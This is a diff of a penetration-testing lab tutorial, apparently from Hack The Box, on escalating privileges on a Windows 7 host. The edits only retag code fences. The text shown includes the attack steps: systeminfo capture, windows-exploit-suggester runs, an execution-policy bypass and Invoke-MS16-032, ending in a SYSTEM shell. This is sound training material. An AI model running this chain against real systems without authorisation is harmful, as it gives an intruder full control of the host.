@@ -37,8 +37,7 @@ Let's look at a Windows 7 host that we may uncover in one of the sectors mention
 
 Once this is done, we need to capture the `systeminfo` command's output and save it to a text file on our attack VM.
 
-```
-        cmd
+```bat
 C:\htb> systeminfo
 
 Host Name:                 WINLPE-WIN7
@@ -68,8 +67,7 @@ Windows Directory:         C:\Windows
 
 We then need to update our local copy of the Microsoft Vulnerability database. This command will save the contents to a local Excel file.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo python2 windows-exploit-suggester.py --update
 ```
 
@@ -77,8 +75,7 @@ hiimeins@htb[/htb]$ sudo python2 windows-exploit-suggester.py --update
 
 Once this is done, we can run the tool against the vulnerability database to check for potential privilege escalation flaws.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python2 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 
 
 [*] initiating winsploit version 3.3...
@@ -156,8 +153,7 @@ Looking through the results, we can see a rather extensive list, some Metasploit
 
 Let's use a [PowerShell PoC](https://www.exploit-db.com/exploits/39719) to attempt to exploit this and elevate our privileges.
 
-```
-        powershell
+```powershell
 PS C:\htb> Set-ExecutionPolicy bypass -scope process
 
 Execution Policy Change
@@ -202,8 +198,7 @@ PS C:\htb> Invoke-MS16-032
 
 This works and we spawn a SYSTEM cmd console.
 
-```
-        cmd
+```bat
 C:\htb> whoami
 
 nt authority\system
